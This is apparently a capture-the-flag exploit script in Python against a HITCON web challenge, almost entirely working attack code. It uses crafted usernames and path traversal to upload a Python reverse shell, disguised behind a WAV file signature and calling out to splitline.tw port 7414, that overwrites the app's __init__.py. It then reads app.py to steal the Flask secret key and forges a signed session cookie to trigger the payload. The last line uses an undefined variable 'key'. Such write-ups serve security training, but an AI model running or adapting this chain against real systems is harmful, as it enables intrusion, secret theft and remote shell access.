import requests
import hashlib

from itsdangerous import URLSafeTimedSerializer, TimestampSigner, base64_encode

HOST = '2emv2stldb.s0undcl0ud.chal.hitconctf.com'

shell = '''
RIFFxxxxWAVEfmt = 1337  # file signature for `audio/x-wav`
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("splitline.tw", 7414))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p = subprocess.call(["/bin/bash", "-i"])
'''.strip()


def sign(data, key):
    signer = TimestampSigner(
        secret_key=key,
        salt="cookie-session",
        key_derivation="hmac",
        digest_method=hashlib.sha1
    )
    return signer.sign(base64_encode(data)).decode()


def login(username, password='pa55w0rd'):
    print(f"[login] {username=}")
    return requests.post(f"http://{HOST}/login", data={
        'username': username,
        'password': password
    }, allow_redirects=False)


login('data:audio')  # musics/data:audio/
login('data:audio/x-wav,')  # musics/data:audio/x-wav,/
login('nyan')       # musics/nyan/
login('nyan/../')   # (500) musics/nyan/../ -> musics/

session = login('nyan/../').cookies.get('session')
requests.post(f"http://{HOST}/upload",
              cookies={'session': session}, # session for user "nyan/../"
              files={"file": ("data:audio/x-wav,/../../__init__.py", shell)})
            #   musics/nyan/../data:audio/x-wav,/../../__init__.py -> musics/__init__.py

app_py = requests.get(f"http://{HOST}/@../app.py").text
secret_key = app_py.split("app.secret_key = '")[1].split("'")[0]

requests.get(f"http://{HOST}/", cookies={"session": sign(b'Vmusics\n2\x93.', key)})
